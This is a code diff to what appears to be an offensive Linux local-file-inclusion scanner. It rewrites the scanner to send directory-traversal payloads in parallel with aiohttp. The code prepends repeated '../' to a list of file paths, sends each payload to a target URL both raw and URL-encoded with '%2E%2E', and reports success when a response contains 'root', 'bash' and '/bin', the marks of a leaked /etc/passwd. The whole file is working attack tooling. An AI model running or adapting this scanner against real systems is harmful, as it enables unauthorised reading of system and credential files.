@@ -1,32 +1,50 @@
-import requests
 import urllib.parse
+import asyncio
+import aiohttp
 from banner.banner import END, GREEN_NORMAL
 
 class LinuxLFI:
-    def execute_attack(file_paths, parse):
-        for path in file_paths:
-            path = path.replace("\n", "")
-            print("=" * 60)
 
-            if parse.walkcount:
-                count = int(parse.walkcount)
-                for i in range(count):
-                    if i == 0:
-                        path = ".." + path
-                    else:
-                        path = "../" + path
-
-                print("Normal Payload: {}".format(path))
-                query = requests.get(parse.target+path)
-                if 'root' and 'bash' and '/bin' in query.text:
-                    print("{}Probable LFI: {}{}".format(GREEN_NORMAL,parse.target+path,END))
-
-                url_encoded_path = urllib.parse.quote(path, encoding='utf-8', safe='')
-                url_encoded_path = url_encoded_path.replace("..", "%2E%2E")
-                print("URL Encoded Payload: {}".format(url_encoded_path))
-                # Send the URL encoded request
-                query = requests.get(parse.target+url_encoded_path)
-                if 'root' in query.text and 'bash' in query.text and '/bin' in query.text:
-                    print("{}Probable LFI: {}{}".format(GREEN_NORMAL, parse.target + url_encoded_path, END))
+    @staticmethod
+    async def execute_attack_parallel(file_paths, parse):
+        file_paths = [line.strip() for line in file_paths]
+        threads_count = int('1') if parse.threads == None else int(parse.threads)
+        batch = []
+        for i in range(len(file_paths)):
+            path = LinuxLFI.get_walk_count(file_paths[i], int(parse.walkcount))
+            # Normal path
+            batch.append(parse.target + path)
+            # URL encoded path
+            url_encoded_path = parse.target + urllib.parse.quote(path, encoding='utf-8', safe='').replace("..", "%2E%2E")
+            batch.append(url_encoded_path)
+            
+            # When batch reaches the specified number of threads, send requests
+            if len(batch) >= threads_count * 2:
+                async with aiohttp.ClientSession() as session:
+                    batch_results = await LinuxLFI.fetch_batch(batch, session)
+                    for j in range(len(batch_results)):
+                        # Check for probable LFI indicators
+                        if 'root' in batch_results[j] and 'bash' in batch_results[j] and '/bin' in batch_results[j]:
+                            print(f"{GREEN_NORMAL}Probable LFI: {batch[j]}{END}")
                 
-        print("=" * 60,"\n")
+                # Clear batch after sending requests
+                batch = []
+
+    @staticmethod
+    async def fetch_batch(urls, session):
+        tasks = [LinuxLFI.fetch(url, session) for url in urls]
+        return await asyncio.gather(*tasks)
+
+    @staticmethod
+    async def fetch(url, session):
+        async with session.get(url) as response:
+            return await response.text()
+    
+    @staticmethod
+    def get_walk_count(path, count): 
+        for i in range(count):
+            if i == 0:
+                path = ".." + path
+            else:
+                path = "../" + path
+        return path
